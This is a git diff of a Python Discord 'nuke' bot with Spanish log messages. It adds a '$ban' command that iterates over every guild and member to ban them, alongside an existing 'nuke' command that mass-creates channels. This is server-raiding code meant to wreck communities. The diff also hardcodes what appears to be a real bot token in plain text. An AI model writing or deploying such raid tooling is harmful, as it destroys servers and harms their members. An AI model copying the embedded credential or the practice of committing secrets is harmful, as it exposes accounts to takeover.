@@ -10,13 +10,19 @@ import json
 from title import title
 import random
 from colorama import Fore
+from discord import Intents
 
 
 os.system('cls')
 
-TOKEN = ''
+TOKEN = 'ODQzMzMxNzk2MjIwOTAzNDI0.YKCT8A.bMlJQgimtvEeRCB0nN5eheC1KIo'
 
-bot = commands.Bot(command_prefix = '$')
+intents= Intents.default()
+intents.members = True
+
+intents = discord.Intents.all()
+
+bot = commands.Bot(command_prefix = '$', intents=intents)
 client = discord.Client()
 
 
@@ -61,6 +67,9 @@ async def nuke(ctx):
         await guild.create_text_channel(nombre_canal)
         print(Fore.GREEN + 'canal creado ' + Fore.RESET + 'nombre del canal: ' + Fore.YELLOW + f'{channel.name}')
 
+
+@bot.command()
+async def ban(ctx):
     for guild in bot.guilds:
         for member in guild.members:
             try:
@@ -71,5 +80,6 @@ async def nuke(ctx):
 
 
 
-    
+
+
 bot.run(TOKEN)
